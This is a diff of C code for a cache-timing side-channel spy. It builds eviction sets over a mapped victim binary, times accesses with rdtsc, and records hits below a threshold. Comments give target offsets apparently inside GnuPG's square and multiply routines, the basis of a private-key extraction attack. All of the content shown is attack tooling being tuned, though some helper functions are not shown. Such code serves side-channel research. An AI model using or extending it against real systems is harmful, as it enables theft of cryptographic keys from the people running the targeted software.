@@ -11,7 +11,8 @@
 
 static Node **spy_evsets = NULL;
 static void *victim;
-static int map_len;
+// static int map_len;
+uint64_t *msrmts_spy;
 
 void *map(char *file_name, uint64_t offset)
 {
@@ -88,7 +89,7 @@ void init_spy(char *target_filepath, int offset_target){
     printf("victim read\n");
 
     // prepare evset
-    Config *spy_conf= config_init(24, 2048, 64, 105, 2097152, 1, 1);
+    Config *spy_conf= config_init(24, 2048, 64, 120, 2097152, 1, 1);
     init_evset(spy_conf);
     printf("init evset done\n");
     spy_evsets = find_evset(spy_conf, victim);
@@ -96,15 +97,15 @@ void init_spy(char *target_filepath, int offset_target){
     
     printf("[+] spy evset for target adrs %p\n", victim);
     list_print(spy_evsets);
+
+    msrmts_spy = malloc(1000000*sizeof(uint64_t));
 }
 
 uint64_t my_detect(void *spy_target){
-    my_access(spy_target);       
+    my_access(spy_target+222);   
+    uint64_t probe = probe_chase_loop(spy_target, 1);
     traverse_list0(*spy_evsets);
-    my_access(spy_target+222);
-
-    // measure access time for one entry
-    return probe_chase_loop(spy_target, 1);       
+    return probe;       
 }
 
 static __inline__ unsigned long long rdtsc(void)
@@ -115,9 +116,9 @@ static __inline__ unsigned long long rdtsc(void)
 }
 
 void my_monitor(void *spy_target){
-    uint64_t detected=0;
+    int ctr =0;
     unsigned long long old_tsc, tsc = rdtsc();
-    my_detect(spy_target);
+    traverse_list0(*spy_evsets);
     while(1)
     {
         old_tsc = tsc;
@@ -126,11 +127,17 @@ void my_monitor(void *spy_target){
         {
             tsc = rdtsc();
         }
-        detected= my_detect(spy_target);
-        if(detected > conf->threshold) break;
+        msrmts_spy[ctr]= my_detect(spy_target);
+        
+        if(msrmts_spy[ctr] < conf->threshold) {
+            printf("[!] victim acitivity detected! cycles %lu, ctr %d\n", msrmts_spy[ctr], ctr);
+        }
+        ctr++;
+        if(ctr >= 1000000) ctr=0;
     }
-    printf("[!] victim acitivity detected!\n");
-    for(int i=0;i<1000;i++) printf("%lu; ", msrmts[i]);
+    
+    for(int i=0;i<100000;i++) printf("%lu; ", msrmts_spy[i]);
+    printf("\n ctr %d \n", ctr);
 }
 
 void spy(char *victim_filepath, int offset_target){
@@ -142,8 +149,10 @@ void spy(char *victim_filepath, int offset_target){
 int main(int ac, char **av){  
     printf("%s\n", av[1]); // first char file path
     printf("%s\n", av[2]); // second file path later, rn hardcoded location 
-    int my_target = 0x1180; 
-    //0x1174; // alder lake
+    // int my_target = 0x15cb;
+    int my_target = 0xd57ed; 
+    //0x15a2-0x1a0a victim_loop2, loop itself 0x15be - 0x15e6 alder lake
+    //0xd57ed madgpg sqr, 0xd571f mul
     // my_access(my_target);
     printf("%d\n", my_target);
     // printf("%p\n", target_loader(av[2]));
